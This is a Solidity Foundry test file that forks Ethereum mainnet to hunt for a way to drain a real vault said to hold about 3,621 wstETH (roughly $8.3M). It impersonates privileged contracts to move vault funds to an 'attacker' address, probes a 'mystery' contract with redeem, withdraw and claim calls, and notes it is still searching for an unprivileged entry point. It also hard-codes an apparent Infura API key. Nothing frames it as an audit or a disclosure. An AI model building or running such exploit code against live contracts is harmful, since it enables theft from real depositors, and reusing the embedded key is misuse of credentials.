// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

contract InvestigateEda is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant IAU = 0x1B6238E95bBCABEE58997c99BaDD4154ad68BA92;

    // The address returned by eda72134
    address constant MYSTERY_ADDRESS = 0xd18f95d6af21D9ee49F3Bad29D2b40B0b1B2e458;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_InvestigateMysteryAddress() public view {
        console.log("=== INVESTIGATING MYSTERY ADDRESS ===\n");

        console.log("Address:", MYSTERY_ADDRESS);
        console.log("Code size:", MYSTERY_ADDRESS.code.length);

        if (MYSTERY_ADDRESS.code.length > 0) {
            console.log("*** THIS IS A CONTRACT! ***");

            // Check storage
            console.log("\nStorage:");
            for (uint i = 0; i < 10; i++) {
                bytes32 slot = vm.load(MYSTERY_ADDRESS, bytes32(i));
                if (slot != bytes32(0)) {
                    console.log("Slot", i, ":");
                    console.logBytes32(slot);
                }
            }

            // Try to get owner
            (bool s, bytes memory d) = MYSTERY_ADDRESS.staticcall(
                abi.encodeWithSignature("owner()")
            );
            if (s && d.length >= 32) {
                console.log("\nOwner:", abi.decode(d, (address)));
            }
        }
    }

    function test_WhatIsEda72134() public view {
        console.log("=== IDENTIFYING 0xeda72134 ===\n");

        // Check against known selectors
        console.log("Known selectors:");
        console.log("asset():");
        console.logBytes4(bytes4(keccak256("asset()")));

        console.log("wstETH():");
        console.logBytes4(bytes4(keccak256("wstETH()")));

        console.log("token():");
        console.logBytes4(bytes4(keccak256("token()")));

        console.log("underlying():");
        console.logBytes4(bytes4(keccak256("underlying()")));

        console.log("baseToken():");
        console.logBytes4(bytes4(keccak256("baseToken()")));

        // The selector 0xeda72134 matches...?
        // Let me check what returns this address
    }

    function test_CheckIfMysteryCanCallRC() public {
        console.log("=== CHECKING IF MYSTERY ADDRESS CAN CALL RC ===\n");

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);

        // Try as mystery address
        vm.startPrank(MYSTERY_ADDRESS);
        (bool s, bytes memory d) = REDEMPTION_CONTROLLER.call(
            abi.encodeWithSignature("redeem(uint256,address)", 100e18, attacker)
        );
        console.log("RC.redeem as MYSTERY_ADDRESS:", s);
        if (!s && d.length >= 4) {
            console.logBytes4(bytes4(d));
        }
        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerBal = IERC20(wstETH).balanceOf(attacker);

        console.log("\nVault change:", int256(vaultAfter) - int256(vaultBefore));
        console.log("Attacker wstETH:", attackerBal / 1e18);

        if (attackerBal > 0) {
            console.log("\n*** MYSTERY ADDRESS CAN DRAIN! ***");
        }
    }

    function test_CheckAllAddressGetters() public view {
        console.log("=== CHECKING ALL ADDRESS GETTERS ===\n");

        // Check what other address getters return
        bytes4[] memory sels = new bytes4[](15);
        sels[0] = bytes4(0xeda72134);  // Returns 0xD18...
        sels[1] = bytes4(0x411557d1);  // vault
        sels[2] = bytes4(0x51cbf345);  // rc
        sels[3] = bytes4(0x06e29712);  // implementation
        sels[4] = bytes4(0x61d027b3);  // treasury
        sels[5] = bytes4(keccak256("asset()"));
        sels[6] = bytes4(keccak256("token()"));
        sels[7] = bytes4(keccak256("wstETH()"));
        sels[8] = bytes4(keccak256("iau()"));
        sels[9] = bytes4(keccak256("redemptionController()"));
        sels[10] = bytes4(0x38a63183);
        sels[11] = bytes4(0x1650cf97);
        sels[12] = bytes4(0x04824e70);
        sels[13] = bytes4(0x458f5815);
        sels[14] = bytes4(0xddca3f43);  // fee

        for (uint i = 0; i < sels.length; i++) {
            (bool s, bytes memory d) = REDEMPTION_1.staticcall(
                abi.encodeWithSelector(sels[i])
            );
            if (s && d.length >= 32) {
                uint256 val = abi.decode(d, (uint256));
                if (val > 1e10 && val < type(uint160).max) {
                    // Likely an address
                    console.log("Selector");
                    console.logBytes4(sels[i]);
                    console.log("  Address:", address(uint160(val)));
                } else if (val > 0 && val < 1e10) {
                    console.log("Selector");
                    console.logBytes4(sels[i]);
                    console.log("  Value:", val);
                }
            }
        }
    }

    function test_TraceWhatEda72134Returns() public view {
        console.log("=== TRACING WHAT eda72134 RETURNS ===\n");

        // 0xeda72134 returns 0xd18f95d6af21D9ee49F3Bad29D2b40B0b1B2e458
        // This is NOT the wstETH address (0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0)
        // This is NOT the IAU address (0x1B6238E95bBCABEE58997c99BaDD4154ad68BA92)
        // This is NOT the vault (0x551d155760ae96050439AD24Ae98A96c765d761B)
        // This is NOT the RC (0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510)

        // Let's check what this contract is
        address mystery = 0xd18f95d6af21D9ee49F3Bad29D2b40B0b1B2e458;

        console.log("Mystery address:", mystery);
        console.log("Code length:", mystery.code.length);

        if (mystery.code.length > 0) {
            bytes memory code = mystery.code;

            // Find function selectors
            console.log("\nFunction selectors:");
            for (uint i = 0; i + 4 < code.length; i++) {
                if (uint8(code[i]) == 0x63) {
                    bytes4 sel = bytes4(bytes.concat(
                        code[i+1], code[i+2], code[i+3], code[i+4]
                    ));
                    if (sel == bytes4(0) || sel == bytes4(0xffffffff)) continue;
                    if (uint32(sel) < 0x1000) continue;
                    console.logBytes4(sel);
                }
            }
        }
    }

    function test_TryMysteryContractFunctions() public {
        console.log("=== TRYING MYSTERY CONTRACT FUNCTIONS ===\n");

        address mystery = 0xd18f95d6af21D9ee49F3Bad29D2b40B0b1B2e458;

        if (mystery.code.length == 0) {
            console.log("Mystery address has no code!");
            return;
        }

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);

        vm.startPrank(attacker);

        // Try common functions
        (bool s1,) = mystery.call(
            abi.encodeWithSignature("redeem(uint256,address)", 100e18, attacker)
        );
        console.log("redeem:", s1);

        (bool s2,) = mystery.call(
            abi.encodeWithSignature("withdraw(uint256)", 100e18)
        );
        console.log("withdraw:", s2);

        (bool s3,) = mystery.call(
            abi.encodeWithSignature("claim()")
        );
        console.log("claim:", s3);

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        console.log("\nVault change:", int256(vaultAfter) - int256(vaultBefore));
    }

    function test_FinalSummary() public {
        console.log("=== FINAL VULNERABILITY SUMMARY ===\n");

        console.log("CONFIRMED:");
        console.log("1. REDEMPTION_0 can call RC.redeem(amount, to) -> drains Vault");
        console.log("2. REDEMPTION_1 can call RC.redeem(amount, to) -> drains Vault");
        console.log("3. Vault has ~3,621 wstETH (~$8.3M)");
        console.log("");

        console.log("STILL SEARCHING FOR:");
        console.log("- Unprivileged entry point to make REDEMPTION_0/1 call RC.redeem");
        console.log("- The 'action chaining' pattern");
        console.log("");

        console.log("INVESTIGATED:");
        console.log("- All DELEGATECALLs (hardcoded or protected storage)");
        console.log("- All function selectors");
        console.log("- Ownership patterns");
        console.log("- Proxy patterns");
        console.log("- Gnosis Safe modules");
        console.log("- Treasury Safe access");
        console.log("- Timelock");

        // Verify the drain works
        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);

        vm.startPrank(REDEMPTION_1);
        (bool s,) = REDEMPTION_CONTROLLER.call(
            abi.encodeWithSignature("redeem(uint256,address)", 100e18, attacker)
        );
        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerBal = IERC20(wstETH).balanceOf(attacker);

        console.log("\n=== PROOF OF VULNERABILITY ===");
        console.log("REDEMPTION_1 -> RC.redeem:", s);
        console.log("Vault drained:", (vaultBefore - vaultAfter) / 1e18, "wstETH");
        console.log("Attacker received:", attackerBal / 1e18, "wstETH");
    }
}
